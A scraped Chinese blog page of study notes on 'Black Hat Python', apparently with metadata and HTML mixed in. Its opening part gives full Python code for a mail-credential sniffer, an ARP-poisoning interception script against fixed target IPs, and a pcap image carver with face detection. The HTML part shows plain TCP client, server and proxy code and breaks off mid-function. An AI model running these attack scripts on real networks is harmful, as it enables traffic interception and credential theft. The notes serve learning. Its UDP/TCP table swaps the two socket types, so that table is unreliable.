目的是找出子網路中的活動ip\n流程是一個thraed對某個子網路的所有ip送udp，如果host還活著，就會退回封包並加上icmp格式的錯誤訊息\nCH4 mail_sniffer.py\nfrom kamene.all import * # our packet callback def packet_callback(packet): if packet[TCP].payload: mail_packet = bytes(packet[TCP].payload) if b'user' in mail_packet.lower() or b'pass' in mail_packet.lower(): print(\"[*] Server: %s\" % packet[IP].dst) print(\"[*] %s\" % packet[TCP].payload) # fire up our sniffer sniff(filter=\"tcp port 110 or tcp port 25 or tcp port 143\", prn=packet_callback, store=0) 這應該很直觀，目的是看tcp payload有沒有user與pass\n之後應該補個tcpdump的條件式語法。\narper.py\nfrom kamene.all import * import sys import threading interface = \"en1\" tgt_ip = \"172.16.1.71\" tgt_gateway = \"172.16.1.254\" packet_count = 1000 poisoning = True def restore_target(gateway_ip, gateway_mac, target_ip, target_mac): # slightly different method using send print(\"[*] Restoring target...\") send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=\"ff:ff:ff:ff:ff:ff\", hwsrc=gateway_mac), count=5) send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=\"ff:ff:ff:ff:ff:ff\", hwsrc=target_mac), count=5) def get_mac(ip_address): responses, unanswered = srp( Ether(dst=\"ff:ff:ff:ff:ff:ff\") / ARP(pdst=ip_address), timeout=2, retry=10 ) # return the MAC address from a response for s, r in responses: return r[Ether].src return None def poison_target(gateway_ip, gateway_mac, target_ip, target_mac): global poisoning poison_tgt = ARP() poison_tgt.op = 2 poison_tgt.psrc = gateway_ip poison_tgt.pdst = target_ip poison_tgt.hwdst = target_mac poison_gateway = ARP() poison_gateway.op = 2 poison_gateway.psrc = target_ip poison_gateway.pdst = gateway_ip poison_gateway.hwdst = gateway_mac print(\"[*] Beginning the ARP poison. [CTRL-C to stop]\") while poisoning: send(poison_tgt) send(poison_gateway) time.sleep(2) print(\"[*] ARP poison attack finished.\") return # set our interface conf.iface = interface # turn off output conf.verb = 0 print(\"[*] Setting up %s\" % interface) tgt_gateway_mac = get_mac(tgt_gateway) if tgt_gateway_mac is None: print(\"[!!!] Failed to get gateway MAC. Exiting.\") sys.exit(0) else: print(\"[*] Gateway %s is at %s\" % (tgt_gateway, tgt_gateway_mac)) tgt_mac = get_mac(tgt_ip) if tgt_mac is None: print(\"[!!!] Failed to get target MAC. Exiting.\") sys.exit(0) else: print(\"[*] Target %s is at %s\" % (tgt_ip, tgt_mac)) # start poison thread poison_thread = threading.Thread(target=poison_target, args=(tgt_gateway, tgt_gateway_mac, tgt_ip, tgt_mac) ) poison_thread.start() try: print(\"[*] Starting sniffer for %d packets\" % packet_count) bpf_filter = \"ip host %s\" % tgt_ip packets = sniff(count=packet_count, filter=bpf_filter, iface=interface ) # write out the captured packets print(\"[*] Writing packets to arper.pcap\") wrpcap('arper.pcap', packets) except KeyboardInterrupt: pass finally: poisoning = False # wait for poisoning thread to exit time.sleep(2) # restore the network restore_target(tgt_gateway, tgt_gateway_mac, tgt_ip, tgt_mac ) sys.exit(0) 這裡是做arp汙染，把gateway的eth addr用成自己的 這樣就能上面的sniffer來看封包\n手法是一直發假的arp這樣只要有機器吃到，就會把封包丟到這裡 但現在這個手法都行不通拉 都會被擋\n還有一個是讀pcap來找出圖片，同時對圖片作人臉辨識 pic_carver.py\nimport cv2 from kamene.all import * pictures_directory = \"pic_carver/pictures\" faces_directory = \"pic_carver/faces\" pcap_file = \"bhp.pcap\" def face_detect(path, file_name): img = cv2.imread(path) cascade = cv2.CascadeClassifier(\"haarcascade_frontalface_alt.xml\") rects = cascade.detectMultiScale(img, 1.3, 4, cv2.CASCADE_SCALE_IMAGE, (20, 20) ) if len(rects) == 0: return False rects[:, 2:] += rects[:, :2] # highlight the faces in the image for x1, y1, x2, y2 in rects: cv2.rectangle(img, (x1, y1), (x2, y2), (127, 255, 0), 2) cv2.imwrite(\"%s/%s-%s\" % (faces_directory, pcap_file, file_name), img) return True def get_http_headers(http_payload): try: # split the headers off if it is HTTP traffic headers_raw = http_payload[:http_payload.index(\"\\r\\n\\r\\n\") + 2] # break out the headers headers = dict( re.findall(r\"(?P.*?): (?P.*?)\\r\\n\", headers_raw)) except: return None if \"Content-Type\" not in headers: return None return headers def extract_image(headers, http_payload): image = None image_type = None try: if \"image\" in headers['Content-Type']: # grab the image type and image body image_type = headers['Content-Type'].split(\"/\")[1] image = http_payload[http_payload.index(\"\\r\\n\\r\\n\") + 4:] # if we detect compression decompress the image try: if \"Content-Encoding\" in list(headers.keys()): if headers['Content-Encoding'] == \"gzip\": image = zlib.decompress(image, 16 + zlib.MAX_WBITS) elif headers['Content-Encoding'] == \"deflate\": image = zlib.decompress(image) except: pass except: return None, None return image, image_type def http_assembler(pcap_fl): carved_images = 0 faces_detected = 0 a = rdpcap(pcap_fl) sessions = a.sessions() for session in sessions: http_payload = \"\" for packet in sessions[session]: try: if packet[TCP].dport == 80 or packet[TCP].sport == 80: # reassemble the stream into a single buffer http_payload += str(packet[TCP].payload) except: pass headers = get_http_headers(http_payload) if headers is None: continue image, image_type = extract_image(headers, http_payload) if image is not None and image_type is not None: # store the image file_name = \"%s-pic_carver_%d.%s\" % ( pcap_fl, carved_images, image_type) fd = open(\"%s/%s\" % (pictures_directory, file_name), \"wb\") fd.write(image) fd.close() carved_images += 1 # now attempt face detection try: result = face_detect(\"%s/%s\" % (pictures_directory, file_name), file_name) if result is True: faces_detected += 1 except: pass return carved_images, faces_detected carved_img, faces_dtct = http_assembler(pcap_file) print(\"Extracted: %d images\" % carved_images) print(\"Detected: %d faces\" % faces_detected) 整個流程是\n把封包導向自己 (arper.py) sniff出需要的封包，存成pcap (mail_sniffer.py，雖然沒有存成pcap的部分) 對pcap做分析(pic_carver.py) ","wordCount":"4264","inLanguage":"en","image":"https://littlebees.github.io/images/papermod-cover.png","datePublished":"2020-09-04T21:16:58Z","dateModified":"2020-09-04T21:16:58Z","author":{"@type":"Person","name":"zhengcf"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://littlebees.github.io/2020/09/blackhat-python-network-programming/"},"publisher":{"@type":"Organization","name":"記事本","logo":{"@type":"ImageObject","url":"https://littlebees.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://littlebees.github.io/ accesskey=h title="記事本 (Alt + H)">記事本</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://littlebees.github.io/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://littlebees.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://littlebees.github.io/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://littlebees.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://littlebees.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">blackhat python - network programming</h1><div class=post-meta><span title='2020-09-04 21:16:58 +0000 UTC'>September 4, 2020</span>&nbsp;·&nbsp;21 min&nbsp;·&nbsp;zhengcf</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#%e5%8b%95%e6%a9%9f aria-label=動機>動機</a></li><li><a href=#%e7%92%b0%e5%a2%83--py3 aria-label="環境 & py3">環境 & py3</a></li><li><a href=#ch2 aria-label=CH2>CH2</a><ul><li><a href=#%e5%9f%ba%e6%9c%ac%e7%9a%84tcp-clientserver aria-label="基本的TCP client&amp;server">基本的TCP client&amp;server</a></li><li><a href=#paramiko-%e7%94%a8python%e6%93%8d%e4%bd%9cssh aria-label="paramiko: 用python操作SSH">paramiko: 用python操作SSH</a></li><li><a href=#%e7%b8%bd%e8%a4%87%e7%bf%92-netcat-replacement aria-label="總複習: Netcat Replacement">總複習: Netcat Replacement</a></li></ul></li><li><a href=#ch3 aria-label=CH3>CH3</a></li><li><a href=#ch4 aria-label=CH4>CH4</a></li></ul></div></details></div><div class=post-content><h2 id=動機>動機<a hidden class=anchor aria-hidden=true href=#動機>#</a></h2><p>來做個筆記吧</p><p>這裡有帶到基本的network programming與SSH的使用</p><h2 id=環境--py3>環境 & py3<a hidden class=anchor aria-hidden=true href=#環境--py3>#</a></h2><p>書上的code是py2，同時code很舊，因此會用<a href=https://github.com/EONRaider/blackhat-python3>這個repo</a>的code來解釋</p><p>用WSL2測試</p><h2 id=ch2>CH2<a hidden class=anchor aria-hidden=true href=#ch2>#</a></h2><h3 id=基本的tcp-clientserver>基本的TCP client&amp;server<a hidden class=anchor aria-hidden=true href=#基本的tcp-clientserver>#</a></h3><p>tcp_client.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>target_host</span> <span class=o>=</span> <span class=s2>&#34;127.0.0.1&#34;</span>
</span></span><span class=line><span class=cl><span class=n>target_port</span> <span class=o>=</span> <span class=mi>9999</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># create a socket object</span>
</span></span><span class=line><span class=cl><span class=n>client</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># connect the client</span>
</span></span><span class=line><span class=cl><span class=n>client</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=n>target_host</span><span class=p>,</span> <span class=n>target_port</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1># NULL!!!</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># send some data</span>
</span></span><span class=line><span class=cl><span class=n>client</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;GET / HTTP/1.1</span><span class=se>\r\n</span><span class=s2>Host: google.com</span><span class=se>\r\n\r\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># client.sendto(b&#34;AAABBBCCC&#34;, (target_host, target_port))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># receive data</span>
</span></span><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>client</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4096</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=p>)</span>
</span></span></code></pre></div><p>UDP & TCP client的差別在</p><table><thead><tr><th></th><th>socket (創socket時)</th><th>connect (與server建立連線，三段握手)</th><th>send (送資料)</th></tr></thead><tbody><tr><td>UDP</td><td>SOCK_STREAM</td><td>不用</td><td>sendto(data, tuple)</td></tr><tr><td>TCP</td><td>SOCK_DGRAM</td><td><code>connect((target_host, target_port))</code></td><td>send(data)</td></tr></tbody></table><hr><p>tcp_server.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>bind_ip</span> <span class=o>=</span> <span class=s2>&#34;0.0.0.0&#34;</span>
</span></span><span class=line><span class=cl><span class=n>bind_port</span> <span class=o>=</span> <span class=mi>9999</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>server</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>server</span><span class=o>.</span><span class=n>bind</span><span class=p>((</span><span class=n>bind_ip</span><span class=p>,</span> <span class=n>bind_port</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>server</span><span class=o>.</span><span class=n>listen</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Listening on </span><span class=si>%s</span><span class=s2>:</span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>bind_ip</span><span class=p>,</span> <span class=n>bind_port</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># this is our client handling thread</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>handle_client</span><span class=p>(</span><span class=n>client_socket</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># just print out what the client sends</span>
</span></span><span class=line><span class=cl>    <span class=n>request</span> <span class=o>=</span> <span class=n>client_socket</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Received: </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>request</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># send back a packet</span>
</span></span><span class=line><span class=cl>    <span class=n>client_socket</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;ACK!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>client_socket</span><span class=o>.</span><span class=n>getpeername</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>client_socket</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>client</span><span class=p>,</span> <span class=n>addr</span> <span class=o>=</span> <span class=n>server</span><span class=o>.</span><span class=n>accept</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Accepted connection from: </span><span class=si>%s</span><span class=s2>:</span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>addr</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>addr</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># spin up our client thread to handle incoming data</span>
</span></span><span class=line><span class=cl>    <span class=n>client_handler</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>handle_client</span><span class=p>,</span> <span class=n>args</span><span class=o>=</span><span class=p>(</span><span class=n>client</span><span class=p>,))</span>
</span></span><span class=line><span class=cl>    <span class=n>client_handler</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span></code></pre></div><p>這裡是用thread來處理每個進來的連線，之後會看到在同一個thread(就原本收連線的thread)處理每個進來的連線的手法(select,epool)</p><hr><p>tcp_proxy.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># this is a pretty hex dumping function directly taken from</span>
</span></span><span class=line><span class=cl><span class=c1># http://code.activestate.com/recipes/142812-hex-dumper/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>hexdump</span><span class=p>(</span><span class=n>src</span><span class=p>,</span> <span class=n>length</span><span class=o>=</span><span class=mi>16</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>digits</span> <span class=o>=</span> <span class=mi>4</span> <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>src</span><span class=p>,</span> <span class=nb>str</span><span class=p>)</span> <span class=k>else</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>src</span><span class=p>),</span> <span class=n>length</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span> <span class=o>=</span> <span class=n>src</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span> <span class=o>+</span> <span class=n>length</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>hexa</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39; &#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=sa>b</span><span class=s2>&#34;</span><span class=si>%0*X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>digits</span><span class=p>,</span> <span class=nb>ord</span><span class=p>(</span><span class=n>x</span><span class=p>))</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>s</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>text</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=n>x</span> <span class=k>if</span> <span class=mh>0x20</span> <span class=o>&lt;=</span> <span class=nb>ord</span><span class=p>(</span><span class=n>x</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mh>0x7F</span> <span class=k>else</span> <span class=sa>b</span><span class=s1>&#39;.&#39;</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>s</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;</span><span class=si>%04X</span><span class=s2>   </span><span class=si>%-*s</span><span class=s2>   </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>length</span> <span class=o>*</span> <span class=p>(</span><span class=n>digits</span> <span class=o>+</span> <span class=mi>1</span><span class=p>),</span> <span class=n>hexa</span><span class=p>,</span> <span class=n>text</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>result</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>receive_from</span><span class=p>(</span><span class=n>connection</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>buffer</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># We set a 2 second time-out. Depending on your target this may need</span>
</span></span><span class=line><span class=cl>    <span class=c1># to be adjusted</span>
</span></span><span class=line><span class=cl>    <span class=n>connection</span><span class=o>.</span><span class=n>settimeout</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># keep reading into the buffer until there&#39;s no more data or we</span>
</span></span><span class=line><span class=cl>        <span class=c1># time-out</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>data</span> <span class=o>=</span> <span class=n>connection</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4096</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>            <span class=n>buffer</span> <span class=o>+=</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>TimeoutError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>buffer</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># modify any requests destined for the remote host</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>request_handler</span><span class=p>(</span><span class=n>buffer</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># perform packet modifications</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>buffer</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># modify any responses destined for the local host</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>response_handler</span><span class=p>(</span><span class=n>buffer</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># perform packet modifications</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>buffer</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>proxy_handler</span><span class=p>(</span><span class=n>client_socket</span><span class=p>,</span> <span class=n>remote_host</span><span class=p>,</span> <span class=n>remote_port</span><span class=p>,</span> <span class=n>receive_first</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># connect to the remote host</span>
</span></span><span class=line><span class=cl>    <span class=n>remote_socket</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>remote_socket</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=n>remote_host</span><span class=p>,</span> <span class=n>remote_port</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># receive data from the remote end if necessary</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>receive_first</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>remote_buffer</span> <span class=o>=</span> <span class=n>receive_from</span><span class=p>(</span><span class=n>remote_socket</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>hexdump</span><span class=p>(</span><span class=n>remote_buffer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># send it to our response handler</span>
</span></span><span class=line><span class=cl>        <span class=n>remote_buffer</span> <span class=o>=</span> <span class=n>response_handler</span><span class=p>(</span><span class=n>remote_buffer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># if we have data to send to our local client send it</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>remote_buffer</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[&lt;==] Sending </span><span class=si>%d</span><span class=s2> bytes to localhost.&#34;</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>remote_buffer</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>client_socket</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>remote_buffer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># now let&#39;s loop and read from local, send to remote, send to local</span>
</span></span><span class=line><span class=cl>    <span class=c1># rinse wash repeat</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># read from local host</span>
</span></span><span class=line><span class=cl>        <span class=n>local_buffer</span> <span class=o>=</span> <span class=n>receive_from</span><span class=p>(</span><span class=n>client_socket</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>local_buffer</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[==&gt;] Received </span><span class=si>%d</span><span class=s2> bytes from localhost.&#34;</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>local_buffer</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>hexdump</span><span class=p>(</span><span class=n>local_buffer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># send it to our request handler</span>
</span></span><span class=line><span class=cl>            <span class=n>local_buffer</span> <span class=o>=</span> <span class=n>request_handler</span><span class=p>(</span><span class=n>local_buffer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># send off the data to the remote host</span>
</span></span><span class=line><span class=cl>            <span class=n>remote_socket</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>local_buffer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[==&gt;] Sent to remote.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># receive back the response</span>
</span></span><span class=line><span class=cl>        <span class=n>remote_buffer</span> <span class=o>=</span> <span class=n>receive_from</span><span class=p>(</span><span class=n>remote_socket</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>remote_buffer</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[&lt;==] Received </span><span class=si>%d</span><span class=s2> bytes from remote.&#34;</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>remote_buffer</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>hexdump</span><span class=p>(</span><span class=n>remote_buffer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># send to our response handler</span>
</span></span><span class=line><span class=cl>            <span class=n>remote_buffer</span> <span class=o>=</span> <span class=n>response_handler</span><span class=p>(</span><span class=n>remote_buffer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># send the response to the local socket</span>
</span></span><span class=line><span class=cl>            <span class=n>client_socket</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>remote_buffer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[&lt;==] Sent to localhost.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># if no more data on either side close the connections</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=nb>len</span><span class=p>(</span><span class=n>local_buffer</span><span class=p>)</span> <span class=ow>or</span> <span class=ow>not</span> <span class=nb>len</span><span class=p>(</span><span class=n>remote_buffer</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>client_socket</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
